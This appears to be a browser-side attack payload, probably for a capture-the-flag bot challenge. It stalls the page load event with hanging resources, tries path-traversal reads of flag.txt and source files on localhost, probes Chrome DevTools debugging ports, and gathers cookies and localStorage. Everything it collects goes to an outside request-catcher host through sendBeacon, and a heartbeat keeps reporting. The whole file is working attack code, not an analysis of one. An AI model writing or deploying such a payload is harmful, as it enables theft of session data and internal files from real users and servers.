(function() {
    'use strict';
    
    const S = 'https://aab.requestcatcher.com';
    
    function addHangingResources() {
        // Method 1: Hanging scripts (blocks load event)
        for (let i = 0; i < 1; i++) {
            const script = document.createElement('script');
            script.src = 'https://httpstat.us/200?sleep=999999&t=js' + i;
            document.head.appendChild(script);
        }
        
        // Method 2: Hanging stylesheets (blocks load event)
        for (let i = 0; i < 1; i++) {
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = 'https://httpstat.us/200?sleep=999999&t=css' + i;
            document.head.appendChild(link);
        }
        
        // Method 3: Hanging images (blocks load event)
        for (let i = 0; i < 1; i++) {
            const img = document.createElement('img');
            img.src = 'https://httpstat.us/200?sleep=999999&t=img' + i;
            img.style.display = 'none';
            document.body.appendChild(img);
        }
        
        console.log('[BYPASS] Added hanging resources - load event will NEVER fire');
        new Image().src = S + '/resources-added';
    }
    
    // Add resources IMMEDIATELY
    if (document.body) {
        addHangingResources();
    } else {
        // If body doesn't exist yet, add on DOMContentLoaded
        document.addEventListener('DOMContentLoaded', addHangingResources);
    }
    
    // Alternative exfiltration (NO file://)
    function exfiltrate() {
        new Image().src = S + '/exfil-start';
        
        // 1. Try internal services
        const targets = [
            'http://localhost:3000/api/quiz',
            'http://localhost:3000/static/../package.json',
            'http://localhost:3000/static/../bot.js',
          'http://localhost:3000/static/../flag.txt',
          'http://localhost:3000/../flag.txt',
          'http://localhost:3000/../../../flag.txt',
          'http://localhost:3000/../../flag.txt',
          'http://localhost:3000/app/../flag.txt',
          'http://localhost:3000/src/../flag.txt',
          'http://localhost:3000/app/src/../../flag.txt',
          
          
            'http://127.0.0.1:3000'
        ];
        
        targets.forEach((url, i) => {
            setTimeout(() => {
                fetch(url)
                    .then(r => r.text())
                    .then(data => {
                        const fd = new FormData();
                        fd.append('url', url);
                        fd.append('data', data);
                        navigator.sendBeacon(S + '/data-' + i, fd);
                    })
                    .catch(e => {
                        new Image().src = S + '/fail-' + i;
                    });
            }, i * 100);
        });
        
        // 2. Check for CDP
        [9222, 9229].forEach(port => {
            fetch(`http://localhost:${port}/json`)
                .then(r => r.json())
                .then(data => {
                    const fd = new FormData();
                    fd.append('cdp', JSON.stringify(data));
                    navigator.sendBeacon(S + '/cdp-port-' + port, fd);
                })
                .catch(() => {});
        });
        
        // 3. Environment info
        const env = {
            ua: navigator.userAgent,
            loc: location.href,
            cookies: document.cookie,
            localStorage: Object.keys(localStorage).map(k => [k, localStorage.getItem(k)])
        };
        navigator.sendBeacon(S + '/env', JSON.stringify(env));
    }
    
    setTimeout(exfiltrate, 200);
    
    // Heartbeat
    let c = 0;
    setInterval(() => {
        c++;
        new Image().src = S + '/alive?n=' + c;
    }, 2000);
    
})();
